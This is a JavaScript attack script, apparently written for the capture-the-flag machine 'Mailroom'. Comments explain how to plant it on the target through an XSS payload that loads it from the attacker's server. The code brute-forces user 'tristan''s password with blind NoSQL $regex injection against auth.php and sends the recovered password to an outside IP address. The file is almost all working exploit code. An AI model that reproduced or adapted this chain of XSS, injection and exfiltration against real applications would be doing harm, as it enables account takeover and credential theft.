





// This script performs a blind NoSQL injection attack to extract the password for the user "tristan" from the target application. It iteratively tests each character of the password by sending POST requests with regex patterns and checks the response length to determine if the guess is correct. Once the password is fully extracted, it sends a GET request to a specified URL with the extracted password as a parameter.

// Requires a vulnerable to XSS parameter , listener in local machine where this javascript will be hosted 

// send payload 
// message=<script src=http://your_ip/xss_payload.js></script>

// Listener in local machine
// php -S your_ip:80

// Create XMLHTTPRequest object
var xhr1 = new XMLHttpRequest();

var xhr2 = new XMLHttpRequest();

// Define the URL to send the request to
var url = "http://staff-review-panel.mailroom.htb/auth.php";

var charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!";

var pw = '';

for (var i = 1; i <= 12; i++) {
    for (var j = 0; j < charset.length; j++){
        xhr1.open("POST", url, false);
        xhr1.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        // Send the request                                                    
        var payload = 'email[$regex]=tristan@mailroom.htb&password[$regex]=^' + pw + charset[j] + '.*';
        xhr1.send(payload);
        if(xhr1.responseText.length == 130){
            pw += charset[j];
            break;
        }
    }
}
xhr2.open('GET' , 'http://10.10.14.125/?password=' + pw , false);
xhr2.send();







